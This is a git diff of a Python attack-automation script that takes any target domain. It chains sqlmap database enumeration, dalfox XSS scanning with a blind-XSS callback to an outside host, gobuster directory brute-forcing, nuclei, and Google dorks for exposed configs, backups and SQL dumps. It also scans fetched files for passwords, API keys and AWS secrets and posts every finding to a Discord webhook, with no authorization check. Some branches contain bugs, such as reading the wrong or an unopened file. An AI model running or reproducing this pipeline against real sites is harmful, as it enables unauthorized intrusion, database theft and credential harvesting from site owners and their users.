@@ -3,33 +3,32 @@ import time
 import requests
 from bs4 import BeautifulSoup
 import re
+from pathlib import Path
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 os.system("clear")
 
 print(f'''
-                                         _                 _     
-                                        | |               | |    
-  ___  ____ ____ ____  ____   ____  ____| | _   ___   ___ | |  _ 
- /___)/ ___) _  |  _ \|  _ \ / _  )/ ___) || \ / _ \ / _ \| | / )
-|___ ( (__( ( | | | | | | | ( (/ /| |   | | | | |_| | |_| | |< ( 
-(___/ \____)_||_|_| |_|_| |_|\____)_|   |_| |_|\___/ \___/|_| \_)
-                                                                 
-[1] SQLI scanner (not done yet)
-[2] JSON/XML/JS/TXT finder (working but not done)
-[3] XSS scanner (not done yet)
-[4] Param spider (probably done)
-[5] Open redirect scanner (working but not done)
-[6] Directory scan with many options (probably done)
-[7] Nuclei vulnerability scanner (done)
-[8] Google hacking (done)
-
+███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
+██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
+███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ 
+╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ 
+███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
+╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝                                                                                                                                                     
+[1] SQLI scanner 
+[2] JSON/XML/JS/TXT finder 
+[3] XSS scanner 
+[4] Param spider 
+[5] Open redirect scanner 
+[6] Directory scan with many options 
+[7] Nuclei vulnerability scanner 
+[8] Google hacking 
 ''')
 
 def sqliauto():
 
     embed = DiscordEmbed(title=f'SQLI SCAN STARTED AGAINST: __{domain}__', color='0000FF')
-    embed.set_thumbnail(url='https://www.seekpng.com/png/full/369-3696460_sql-injection-sql-injection-png.png')
+    embed.set_image(url='https://www.seekpng.com/png/full/369-3696460_sql-injection-sql-injection-png.png')
 
     sqli.add_embed(embed)
     sqli.execute(remove_embeds=True, remove_files=True)
@@ -57,19 +56,20 @@ def sqliauto():
 
             os.system(f"sqlmap -u {line} --risk 2 --level 2 --random-agent --random-agent --batch --threads=10 --dbs > ./LOGGER/{domain}/logSQLI.txt")
 
-            with open(f'./LOGGER/{domain}/logSQLI.txt') as f:
-                contents = f.read()
-                w = "might be vulnerable"
-                if w in contents:
-                    vuln = DiscordEmbed(title=f'TARGET MIGHT BE VULNERABLE', description=f'[ - ] URL: {line}', color='00FF00')
+            w = "might be vulnerable"
+
+            if w in open(f'./LOGGER/{domain}/logSQLI.txt').read():
+
+                with open(f'./LOGGER/{domain}/logSQLI.txt') as f:
+
+                    vuln = DiscordEmbed(title=f'TARGET MIGHT BE VULNERABLE TO SQLI', description=f'[ - ] URL: {line}', color='00FF00')
                     sqli.add_file(file=f.read(), filename='log.txt')
                     sqli.add_embed(vuln)
                     sqli.execute(vuln)
 
                     time.sleep(20)
 
-                else:
-                    print("[!] not vulnerable! skipping...")
+            else:
                     notvuln = DiscordEmbed(title=f'TARGET MIGHT NOT BE VULNERABLE BUT HERE IS THE LOG', description=f'[ - ] URL: {line}', color='FF0000')
                     sqli.add_file(file=f.read(), filename='log.txt')
                     sqli.add_embed(notvuln)
@@ -80,7 +80,7 @@ def sqliauto():
 def ifinder():
 
     embed = DiscordEmbed(title=f'SENSI INFO FINDER STARTED AGAINST: __{domain}__', color='0000FF')
-    embed.set_thumbnail(url='https://sysnetgs.com/wp-content/uploads/2016/12/iStock_000038899232_1350.jpg')
+    embed.set_image(url='https://sysnetgs.com/wp-content/uploads/2016/12/iStock_000038899232_1350.jpg')
 
     sensinfo.add_embed(embed)
     sensinfo.execute(remove_embeds=True, remove_files=True)
@@ -102,7 +102,7 @@ def ifinder():
         for line in file:
             line = line.strip()
 
-            interesting = ['password', 'ftp', 'login', 'apikey', 'api', 'secret', 'vpn', 'server', 'email', 'root', 'admin', 'backup', 'ssh', 'db_username', 'token', 'client_secret', 'aws', 'datacenter', 'secretkey', 'keys', 'serverHMACSecretKey', 'auth', 'db_database', 'access_key', 'secret_access', 'amazonaws', 'sql', 'mdb', 'dbf']
+            interesting = ['password:', 'secret key', 'access-key', 'access token', 'access_token', 'aws-access', 'secret:', 'secret key', 'secret :', 'secret is:', 'secret=', 'secret =', 'password =', 'password=', 'privatekey', 'api-key', 'api-token', 'client=secret', 'ftp', 'login', 'apikey', 'api', 'secret', 'vpn', 'server', 'email', 'root', 'admin', 'backup', 'ssh', 'db_username', 'token', 'client_secret', 'aws', 'datacenter', 'secretkey', 'keys', 'serverHMACSecretKey', 'auth', 'db_database', 'access_key', 'secret_access', 'amazonaws', 'sql', 'mdb', 'dbf']
 
             r = requests.get(f"{line}")
 
@@ -126,47 +126,53 @@ def ifinder():
 
                         time.sleep(30)
 
-def xsstest():
+
+def xss():
 
     embed = DiscordEmbed(title=f'XSS SCAN STARTED', color='0000FF')
-    embed.set_thumbnail(url='https://www.wpexplorer.com/wp-content/uploads/wordpress-cross-site-scripting-guide-prevention.png')
+    embed.set_image(url='https://www.wpexplorer.com/wp-content/uploads/wordpress-cross-site-scripting-guide-prevention.png')
 
-    xss.add_embed(embed)
-    xss.execute(remove_embeds=True, remove_files=True)
+    xssw.add_embed(embed)
+    xssw.execute(remove_embeds=True, remove_files=True)
 
-    time.sleep(1)
+    os.system(f"subfinder -d {domain} | waybackurls | grep '=' | httpx > ./LOGGER/{domain}/paramsXSS.txt")
 
-    file = open(f'{fuzz}')
+    time.sleep(3)
+
+    file = open(f'./LOGGER/{domain}/paramsXSS.txt')
 
     while True:
 
         for line in file:
             line = line.strip()
 
-            time.sleep(5)
+            os.system(f"dalfox url {line} -b https://hahwul.xss.ht/ > ./LOGGER/{domain}/logXSS.txt")
 
-            os.system(f"ffuf -w ./payloads/xss.txt -u {line} -c -sa -v -o xss.txt")
+            w = "POC"
 
-            print(f"SCANNING: {line}")
+            if w in open(f'./LOGGER/{domain}/logXSS.txt').read():
 
-            e = "Errors: 0"
+                with open(f'./LOGGER/{domain}/logXSS.txt') as f:
 
-            if e in open('xss.txt').read():
-                print("not interesting, skipping...")
+                    vuln = DiscordEmbed(title=f'TARGET MIGHT BE VULNERABLE TO XSS', description=f'[ - ] URL: {line}', color='00FF00')
+                    xssw.add_file(file=f.read(), filename='logXSS.txt')
+                    xssw.add_embed(vuln)
+                    xssw.execute(vuln)
 
+                    time.sleep(20)
             else:
 
-                with open("xss.txt", "rb") as f:
+                    notvuln = DiscordEmbed(title=f'TARGET MIGHT NOT BE VULNERABLE BUT HERE IS THE LOG', description=f'[ - ] URL: {line}', color='FF0000')
+                    xssw.add_file(file=f.read(), filename='logXSS.txt')
+                    xssw.add_embed(notvuln)
+                    xssw.execute(notvuln)
 
-                    vuln = DiscordEmbed(title=f'THIS ONE MIGHT BE INTERESTING', description=f'[ - ] URL: {line}', color='00FF00')
-                    xss.add_file(file=f.read(), filename='xss.txt')
-                    xss.add_embed(vuln)
-                    xss.execute(vuln)
+                    time.sleep(20)
 
 def paramspider():
 
     embed = DiscordEmbed(title=f'PARAM SCAN STARTED AGAINST: __{domain}__', color='0000FF')
-    embed.set_thumbnail(url='https://cdn-icons-png.flaticon.com/512/47/47282.png')
+    embed.set_image(url='https://cdn-icons-png.flaticon.com/512/47/47282.png')
 
     param.add_embed(embed)
     param.execute(remove_embeds=True, remove_files=True)
@@ -185,7 +191,7 @@ def paramspider():
 def openr():
 
     embed = DiscordEmbed(title=f'OPEN REDIRECT SCAN STARTED AGAINST: __{domain}__', color='0000FF')
-    embed.set_thumbnail(url='https://cdn-icons-png.flaticon.com/512/3165/3165554.png')
+    embed.set_image(url='https://cdn-icons-png.flaticon.com/512/3165/3165554.png')
 
     redirect.add_embed(embed)
     redirect.execute(remove_embeds=True, remove_files=True)
@@ -209,7 +215,7 @@ def openr():
 
             r = requests.get(f'{line}', stream=True)
 
-            if r.status_code == 301 or r.status_code == 302 or r.status_code == 303:
+            if r.status_code == 301:
 
                 print(f"found: {line}")
 
@@ -359,16 +365,107 @@ def directoryscan():
         with open("top_robotsdisallowdir.txt", "rb") as f:
 
             d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
-            directory.add_file(file=f.read(), filename='phpdir.txt')
+            directory.add_file(file=f.read(), filename='robotsdir.txt')
             directory.add_embed(d)
             directory.execute(d)        
 
         os.system("rm top_robotsdisallowdir.txt")
 
+    if wordlistinput == "11":    
+        w = "./wordlist/kibana.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > kibana.txt")
+
+        with open("kibana.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='phpdir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm kibana.txt")
+
+    if wordlistinput == "12":    
+        w = "./wordlist/pl.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > pl.txt")
+
+        with open("pl.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='pldir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm pl.txt")
+
+    if wordlistinput == "13":    
+        w = "./wordlist/xml.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > xml.txt")
+
+        with open("pl.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='xmldir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm xml.txt")
+
+    if wordlistinput == "14":    
+        w = "./wordlist/cgi-bin.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > cgi-bin.txt")
+
+        with open("cgi-bin.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='cgi-bindir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm cgi-bin.txt")
+
+    if wordlistinput == "15":    
+        w = "./wordlist/mix.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > mix.txt")
+
+        with open("mix.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='mixdir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm mix.txt")
+
+    if wordlistinput == "16":    
+        w = "./wordlist/php2.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > php2.txt")
+
+        with open("php2.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='php2dir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm php2.txt")
+
+    if wordlistinput == "17":    
+        w = "./wordlist/jsf.txt"
+        os.system(f"gobuster dir -u https://{domain}/ -w {w} > jsf.txt")
+
+        with open("jsf.txt", "rb") as f:
+
+            d = DiscordEmbed(title=f'FINISHED SCANNING DIRECTORY', description=f'[ - ] URL: https://{domain} \n[ - ] WORDLIST: top_robotstxt_disallow.txt', color='00FF00')
+            directory.add_file(file=f.read(), filename='jsfdir.txt')
+            directory.add_embed(d)
+            directory.execute(d)        
+
+        os.system("rm jsf.txt")
+
 def nucleiscan():
 
     embed = DiscordEmbed(title=f'NUCLEI SCAN STARTED AGAINST: __{domain}__', color='0000FF')
-    embed.set_thumbnail(url='https://cdn-icons-png.flaticon.com/512/3003/3003592.png')
+    embed.set_image(url='https://cdn-icons-png.flaticon.com/512/3003/3003592.png')
 
     nuclei.add_embed(embed)
     nuclei.execute(remove_embeds=True, remove_files=True)
@@ -409,14 +506,22 @@ def googlehacking():
 
     def l():
 
-        with open("webh.txt", "rb") as f:
+        checker = 'webh.txt'
+        path = Path(checker)
 
-            g = DiscordEmbed(title=f'GOOGLE HACKING', description=f'[ - ] URL: https://{domain} \n[ - ] DORK: {dork}', color='00FF00')
-            googleh.add_file(file=f.read(), filename='webh.txt')
-            googleh.add_embed(g)
-            googleh.execute(g)
+        if path.is_file():
 
-        os.system("rm webh.txt")
+            with open("webh.txt", "rb") as f:
+
+                g = DiscordEmbed(title=f'GOOGLE HACKING', description=f'[ - ] URL: https://{domain} \n[ - ] DORK: {dork}', color='00FF00')
+                googleh.add_file(file=f.read(), filename='webh.txt')
+                googleh.add_embed(g)
+                googleh.execute(g)
+
+                os.system("rm webh.txt")
+
+        else:
+            pass
 
     print("""
 [1] Publicly exposed documents
@@ -433,6 +538,8 @@ def googlehacking():
 [12] Search github.com and gitlab.com 
 [13] Search stackoverflow.com
 [14] Signup pages
+
+[all] sends all the options at the same time but delayed.
     """)
 
     dork = input("dork option => ")
@@ -523,6 +630,119 @@ def googlehacking():
         r()
         l()
 
+    if dork == "all":
+
+        embed = DiscordEmbed(title=f'FULL GOOGLEHACKING SCAN STARTED!', description=f'[ - ] TARGET: {domain} \n[ - ] DORKS: 14\n[ - ] ESTIMATED TIME TO BE DONE: 7 MINUTES', color='0000FF')
+        embed.set_image(url='https://thehackernews.com/images/-t0syJYrfZA4/Xd5M5DAou8I/AAAAAAAA13A/GM5c_TEqqmkDAiqdmvNCcInVJ_-q1TEwgCLcBGAsYHQ/s728-e100/google-hacking.png')
+
+        googleh.add_embed(embed)
+        googleh.execute(remove_embeds=True, remove_files=True)
+
+        time.sleep(10)
+
+        #1
+        dork = "ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #2
+        dork = "intitle:index.of"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #3
+        dork = "ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini | ext:env"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #4
+        dork = "ext:sql | ext:dbf | ext:mdb"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #5
+        dork = "ext:log"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #6
+        dork = "ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #7
+        dork = 'inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth'
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #8
+        dork = 'intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()'
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #9
+        dork = '"PHP Parse error" | "PHP Warning" | "PHP Error"'
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+        #10
+        dork = 'ext:php intitle:phpinfo "published by the PHP Group"'
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+
+        #11
+        dork = "pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org  | site:codeshare.io | site:trello.com"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+
+        #12
+        dork = "github.com | site:gitlab.com"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+
+        #13
+        dork = "stackoverflow.com"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+
+        #14
+        dork = "inurl:signup | inurl:register | intitle:Signup"
+        page = requests.get(f"https://www.google.com/search?q=site:{domain} {dork}")
+        r()
+        l()
+
+        time.sleep(30)
+
 option = input("option => ")
 
 if option == "1":
@@ -543,10 +763,10 @@ if option == "2":
 
 if option == "3":
     os.system("clear")
-    fuzz = input("file name => ")
+    domain = input("domain => ")
     url = input("webhook => ")
-    xss = DiscordWebhook(url=f'{url}', username="xss")
-    xsstest()
+    xssw = DiscordWebhook(url=f'{url}', username="xss")
+    xss()
 
 if option == "4":
     os.system("clear")
@@ -578,6 +798,13 @@ if option == "6":
 [8] Logs
 [9] PHP
 [10] Top robots.txt disallow
+[11] Kibana
+[12] PL
+[13] XML
+[14] CGI-BIN
+[15] Mix
+[16] PHP 2
+[17] JSF
     """)    
     directory = DiscordWebhook(url=f'{url}', username="directory")
     directoryscan()
